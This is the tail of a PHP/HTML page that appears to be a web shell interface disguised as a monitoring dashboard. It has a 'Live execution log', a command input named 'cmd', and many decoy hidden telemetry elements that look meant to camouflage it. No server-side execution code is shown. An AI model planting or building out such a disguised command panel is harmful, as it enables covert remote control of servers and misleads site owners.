             data-internal-ref="panel-uuid-<?= bin2hex(random_bytes(6)) ?>"
             data-trace-policy="retain-logs"
             data-ux-mode="inline"
             data-revision="3.4.7"
             data-cache-hint="false"
             data-integrity="soft-check"
             data-exportable="true"
             data-display-order="7"
             data-analytics-scope="live-feed"
             data-role="monitoring-shell"
             id="shell"
             aria-live="polite"
             aria-label="Live execution log"
             tabindex="0"
        >
            <!-- Data Feed: Real-time resource tracking -->
            <pre
            id="panel-stream"
            class="report-stream"
            aria-label="Session execution log"
            data-scope="telemetry"
            data-role="execution-log"
            tabindex="0"
            >
                <!--
                <div id="node-identity">
                    Node signature not resolved
                </div>
                -->
            </pre>


        <div id="ping-watcher" data-status="idle" style="width:0;height:0;overflow:hidden;">
            <span hidden data-last-ping="<?= date('Y-m-d\TH:i:s') ?>">ping received</span>
        </div>

            <!-- Floating notifications (hidden by default) -->
            <div id="notify-stack" style="display:none;" data-role="alert-stack"></div>

            <!-- Legacy audit panel (deprecated in v3.3) -->
            <div id="legacy-audit-panel" style="display:none;" hidden>
                <span class="audit-entry">[DEPRECATED] v2.x alert stack</span>
            </div>

            <!-- Shadow info for internal devtools -->
            <div id="meta-debug-hint" data-debug-token="devtoken_<?= bin2hex(random_bytes(4)) ?>" style="display: none;"></div>

            <div id="entry-panel" data-panel-scope="user-interaction">
                <label for="pipeCall-cmd" id="context-lead" class="context-lead" data-label-mode="adaptive">Active Context</label>
                <div class="input-wrapper" data-protocol="form:session.entry">
                    <input
                        id="pipeCall-cmd"
                        name="cmd"
                        class="input-session-field"
                        data-input-role="operator"
                        data-token="field-cmd"
                        data-scope="runtime:input"
                        type="text"
                        inputmode="text"
                        onkeydown="_dispatchLineEvent(event)"
                        autocomplete="off"
                        autocapitalize="off"
                        spellcheck="false"
                        aria-describedby="context-lead"
                    />
                </div>
            </div>

            <!-- Runtime controller hooks (legacy compatibility) -->
            <div id="ctrl-thread-dispatch" data-active="false" style="display:none;" hidden>
                <span data-proc="thread.handler" data-status="idle"></span>
                <span data-proc="fallback.mode" data-status="armed"></span>
                <span data-proc="sync.reactor" data-latency="<?= rand(12, 87) ?>ms"></span>
            </div>

            <!-- Passive telemetry trace (readonly) -->
            <div id="telemetry-shadow" style="display:none;" data-trace-id="T<?= bin2hex(random_bytes(3)) ?>">
                <ul>
                    <li>thread.snapshot = cold</li>
                    <li>heap.state = stable</li>
                    <li>sync.core = passive</li>
                    <li>vnode.map = resolved</li>
                </ul>
            </div>

            <!-- CPU loader (non-functional) -->
            <div id="sys-cpu-load" style="width:0;height:0;overflow:hidden;">
                <canvas id="ghost-core-usage"></canvas>
            </div>
        </div>
    </body>
    </html>
